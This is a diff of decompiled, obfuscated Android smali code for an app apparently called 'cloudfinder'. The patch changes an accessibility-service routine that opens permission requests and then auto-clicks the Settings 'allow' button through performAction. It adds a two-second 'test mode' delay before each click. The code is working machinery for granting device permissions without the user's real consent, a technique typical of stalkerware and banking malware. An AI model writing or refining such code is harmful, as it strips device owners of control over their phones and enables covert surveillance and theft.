@@ -4355,14 +4355,15 @@
 
     # 无障碍连上后延迟 2 秒再拉权限申请
     :try_start_perm
-    sget-object v0, Lڟەطڽٲ/ؠ;->ء:Landroid/os/Handler;
-    if-eqz v0, :cond_perm_skip
     move-object/from16 v4, p0
+    new-instance v0, Landroid/os/Handler;
+    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
+    move-result-object v1
+    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
     new-instance v1, Lcom/lite/cloudfinder/activity/PermStarter;
     invoke-direct {v1, v4}, Lcom/lite/cloudfinder/activity/PermStarter;-><init>(Landroid/content/Context;)V
     const-wide/16 v2, 0x7d0
     invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
-    :cond_perm_skip
     :try_end_perm
     .catch Ljava/lang/Exception; {:try_start_perm .. :try_end_perm} :catch_perm
     goto :goto_perm
@@ -10970,7 +10971,7 @@
 .end method
 
 .method public final ع(Ljava/lang/String;)V
-    .locals 12
+    .locals 14
 
     const-string v0, "com.android.settings:id/action_button"
 
@@ -11236,7 +11237,13 @@
 
     invoke-static {v3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
-    invoke-virtual {v10, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
+    # 测试模式：延迟 2 秒再点允许，方便看清每个权限框
+    new-instance v9, Lcom/lite/cloudfinder/accessibility/ClickDelay;
+    invoke-direct {v9, v10}, Lcom/lite/cloudfinder/accessibility/ClickDelay;-><init>(Landroid/view/accessibility/AccessibilityNodeInfo;)V
+    sget-object v10, Lڟەطڽٲ/ؠ;->ء:Landroid/os/Handler;
+    const-wide/16 v12, 0x7d0
+    invoke-virtual {v10, v9, v12, v13}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
+
 
     return-void
 
